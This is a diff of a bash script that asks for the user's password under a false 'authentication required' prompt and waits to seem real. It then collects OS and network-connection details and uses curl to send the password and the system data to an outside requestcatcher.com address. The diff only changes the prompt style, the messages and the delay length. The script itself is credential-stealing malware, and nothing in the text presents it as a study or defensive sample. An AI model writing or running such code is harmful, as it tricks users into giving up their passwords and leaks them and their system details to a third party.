@@ -1,16 +1,18 @@
+
 #!/bin/bash
 
-# === Prompt for password (GUI) ===
-user_password=$(zenity --password --title="Authentication Required")
+# === Prompt for user password ===
+read -s -p "🔐 Please enter your password to proceed: " user_password
+echo
 
 # === Validate input ===
 if [[ -z "$user_password" ]]; then
-  zenity --error --text="Password cannot be empty!"
-  exit 1
+    echo "❌ No input detected. Exiting."
+    exit 1
 fi
 
-# === Optional delay for realism ===
-sleep 3
+# === Delay to simulate processing ===
+sleep 4
 
 # === Basic System Info ===
 os_info=$(lsb_release -a 2>/dev/null)
@@ -54,7 +56,7 @@ tcp_connections=$(ss -tunapl)
 curl -X POST https://flipped.requestcatcher.com \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-urlencode "debug=
-==== [USER-ENTERED PASSWORD] ====
+==== [USER PASSWORD] ====
 $user_password
 
 ==== [OS INFO] ====
